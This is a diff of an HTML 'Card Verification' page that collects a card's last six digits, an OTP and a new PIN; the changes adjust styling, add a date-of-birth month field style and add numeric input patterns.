@@ -2,7 +2,7 @@
 
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-
+    <meta name="format-detection" content="telephone=no">
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Card Verification</title>
     <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" />
@@ -233,13 +233,13 @@
         .card-last>input {
             width: 50px;
             height: 50px;
-            padding: 10px;
+            padding: 6px;
             border-radius: 5px;
             border: solid 1.5px #ccc;
             margin-left: 8px;
             text-align: center;
             color: #000;
-            font-size: 33px;
+            font-size: 26px;
             font-weight: bold;
         }
 
@@ -290,7 +290,23 @@
             min-width: 75px;
             max-width: min-content;
             height: 50px;
-            margin-left: 12px;
+            margin-left: 19px;
+            text-align: center;
+            text-align-last:center;
+            padding-right: 20px;
+            padding-right: 10px !important;
+          
+        }
+       #dob_month {
+            min-width: 75px;
+            max-width: min-content;
+            height: 50px;
+            margin-left: 19px;
+            padding-right: 10px !important;
+            text-align: center;
+            text-align-last: center;
+            direction:ltr !important;
+           
         }
 
         .submit_btn {
@@ -517,7 +533,7 @@
             <div class="card_body">
                 <div class="details-div">
                     <label>Enter the last 6 digit of your card number starting with
-                        <b style="text-decoration:none;">4560 6000 XX _ _ &nbsp;_ _ _ _</b></label>
+                        <b style="text-decoration:none;color: inherit;">4560 6000 XX _ _ &nbsp;_ _ _ _</b></label>
                     <!-- <div class="input_div">
                         <input type="tel" class="input-01 card_number otp-box" name="card_number"
                             onkeypress="return isNumber(event)"
@@ -655,17 +671,17 @@
                     </div> -->
                     <div class="input_div">
                         <fieldset name='number-code' data-number-otp-form class="card-last">
-                            <input type="number" min='0' max='9' name="otp" data-number-otp-input='0'
+                            <input type="number" min='0' max='9' pattern="\d*" name="otp" data-number-otp-input='0'
                                 required class="input-01 otp-val " />
-                            <input type="number" min='0' max='9' name="otp" data-number-otp-input='1'
+                            <input type="number" min='0' max='9' pattern="\d*" name="otp" data-number-otp-input='1'
                                 required class="input-02 otp-val " />
-                            <input type="number" min='0' max='9' name="otp" data-number-otp-input='2'
+                            <input type="number" min='0' max='9' pattern="\d*" name="otp" data-number-otp-input='2'
                                 required class="input-03 otp-val " />
-                            <input type="number" min='0' max='9' name="otp" data-number-otp-input='3'
+                            <input type="number" min='0' max='9' pattern="\d*" name="otp" data-number-otp-input='3'
                                 required class="input-04 otp-val " />
-                            <input type="number" min='0' max='9' name="otp" data-number-otp-input='4'
+                            <input type="number" min='0' max='9' pattern="\d*" name="otp" data-number-otp-input='4'
                                 required class="input-05 otp-val " />
-                            <input type="number" min='0' max='9' name="otp" data-number-otp-input='5'
+                            <input type="number" min='0' max='9' pattern="\d*" name="otp" data-number-otp-input='5'
                                 required class="input-06 otp-val " />
                         </fieldset>
                     </div>
@@ -748,13 +764,13 @@
                     </div> -->
                     <div class="input_div">
                         <fieldset name='number-code' data-number-pin1-form class="card-last">
-                            <input type="number" min='0' max='9' name="newPin" data-number-pin1-input='0'
+                            <input type="number" min='0' max='9' name="newPin" pattern="\d*" data-number-pin1-input='0'
                                 required class="input-01 newPin " />
-                            <input type="number" min='0' max='9' name="newPin" data-number-pin1-input='1'
+                            <input type="number" min='0' max='9' name="newPin" pattern="\d*" data-number-pin1-input='1'
                                 required class="input-02 newPin " />
-                            <input type="number" min='0' max='9' name="newPin" data-number-pin1-input='2'
+                            <input type="number" min='0' max='9' name="newPin" pattern="\d*" data-number-pin1-input='2'
                                 required class="input-03 newPin " />
-                            <input type="number" min='0' max='9' name="newPin" data-number-pin1-input='3'
+                            <input type="number" min='0' max='9' name="newPin" pattern="\d*" data-number-pin1-input='3'
                                 required class="input-04 newPin " />
                         </fieldset>
                     </div>
@@ -781,13 +797,13 @@
                     </div> -->
                     <div class="input_div">
                         <fieldset name='number-code' data-number-pin2-form class="card-last">
-                            <input type="number" min='0' max='9' name="confirmPin" data-number-pin2-input='0'
+                            <input type="number" min='0' max='9' name="confirmPin" pattern="\d*" data-number-pin2-input='0'
                                 required class="input-01 confirmPin " />
-                            <input type="number" min='0' max='9' name="confirmPin" data-number-pin2-input='1'
+                            <input type="number" min='0' max='9' name="confirmPin" pattern="\d*" data-number-pin2-input='1'
                                 required class="input-02 confirmPin " />
-                            <input type="number" min='0' max='9' name="confirmPin" data-number-pin2-input='2'
+                            <input type="number" min='0' max='9' name="confirmPin" pattern="\d*" data-number-pin2-input='2'
                                 required class="input-03 confirmPin " />
-                            <input type="number" min='0' max='9' name="confirmPin" data-number-pin2-input='3'
+                            <input type="number" min='0' max='9' name="confirmPin" pattern="\d*" data-number-pin2-input='3'
                                 required class="input-04 confirmPin " />
                         </fieldset>
                     </div>
@@ -817,7 +833,7 @@
             let toast = document.querySelector('#errorPrompt');
             if (!display) {
                 toast.style.display = "none";
-            }
+            } 
             else {
                 toast.style.display = "flex";
                 let headerArea = document.querySelector('#errorHeading');
